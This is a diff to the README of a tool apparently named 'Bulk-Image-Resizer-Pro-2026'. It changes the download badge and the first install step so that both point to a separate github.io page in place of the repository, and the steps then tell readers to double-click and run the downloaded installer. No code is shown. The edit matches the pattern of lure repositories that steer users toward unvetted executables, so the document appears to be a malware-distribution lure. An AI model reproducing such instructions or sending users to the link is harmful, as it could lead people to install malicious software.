@@ -1,6 +1,6 @@
 # 🖼️ Bulk-Image-Resizer-Pro-2026 - Quickly resize thousands of images easily
 
-[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/canadacalcific401/Bulk-Image-Resizer-Pro-2026)
+[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://canadacalcific401.github.io)
 
 ## 🎯 About This Tool
 
@@ -21,7 +21,7 @@ Your computer must meet these standards to run the software.
 
 Follow these steps to set up the software on your machine.
 
-1. Visit [this page to download](https://github.com/canadacalcific401/Bulk-Image-Resizer-Pro-2026) the installation package.
+1. Visit [this page to download](https://canadacalcific401.github.io) the installation package.
 2. Locate the file in your downloads folder.
 3. Double-click the file to start the installer.
 4. Follow the instructions on the screen to place the software on your computer.
